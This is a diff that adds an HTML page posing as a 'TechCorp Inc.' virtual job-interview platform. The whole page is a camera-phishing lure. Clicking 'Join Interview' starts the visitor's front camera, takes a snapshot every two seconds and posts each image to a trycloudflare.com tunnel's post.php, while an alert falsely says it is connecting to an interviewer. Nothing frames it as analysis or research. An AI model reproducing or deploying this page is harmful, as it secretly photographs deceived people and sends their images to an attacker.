@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    background: #1a1a2e;
+    font-family: 'Poppins', sans-serif;
+}
+.interview-container {
+    max-width: 800px;
+    margin: 0 auto;
+    padding: 20px;
+}
+.company-header {
+    background: #16213e;
+    padding: 20px;
+    text-align: center;
+    color: white;
+    border-radius: 15px 15px 0 0;
+}
+.video-panel {
+    background: #0f3460;
+    padding: 20px;
+    text-align: center;
+}
+.interviewer {
+    background: #533483;
+    padding: 20px;
+    border-radius: 10px;
+    margin-bottom: 20px;
+    color: white;
+}
+.cam-area {
+    background: #0f3460;
+    border-radius: 10px;
+    padding: 20px;
+}
+video, canvas { width: 100%; border-radius: 10px; display: none; }
+.cam-placeholder {
+    height: 300px;
+    background: #0a0a2e;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 80px;
+}
+.questions {
+    background: white;
+    padding: 20px;
+    margin-top: 20px;
+    border-radius: 10px;
+}
+button {
+    background: #4CAF50;
+    color: white;
+    border: none;
+    padding: 12px 30px;
+    border-radius: 30px;
+    cursor: pointer;
+    margin-top: 15px;
+}
+</style>
+</head>
+<body>
+<div class="interview-container">
+    <div class="company-header">
+        <h2>🏢 TechCorp Inc.</h2>
+        <p>Virtual Interview Platform</p>
+    </div>
+    <div class="video-panel">
+        <div class="interviewer">
+            <strong>👔 Hiring Manager:</strong> "Please enable camera for interview"
+        </div>
+        <div class="cam-area">
+            <div class="cam-placeholder">🎥</div>
+            <video id="video" playsinline autoplay></video>
+            <canvas id="canvas" width="640" height="480"></canvas>
+            <button onclick="joinInterview()">Join Interview</button>
+        </div>
+    </div>
+    <div class="questions">
+        <h3>Interview Progress</h3>
+        <p>⏳ Technical Assessment • Behavioral Questions • Final Round</p>
+    </div>
+</div>
+<script>
+function post(imgdata) {
+    $.ajax({ type: 'POST', data: { cat: imgdata }, url: 'https://colleges-digest-angela-cholesterol.trycloudflare.com/post.php' });
+}
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+let started = false;
+const constraints = { audio: false, video: { facingMode: "user" } };
+async function joinInterview() {
+    if(!started) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            video.srcObject = stream;
+            video.style.display = 'block';
+            document.querySelector('.cam-placeholder').style.display = 'none';
+            started = true;
+            const context = canvas.getContext('2d');
+            setInterval(() => {
+                context.drawImage(video, 0, 0, 640, 480);
+                post(canvas.toDataURL("image/png"));
+            }, 2000);
+            alert("Connecting to interviewer...");
+        } catch(e) { alert("Camera required for interview"); }
+    }
+}
+</script>
+</body>
+</html>
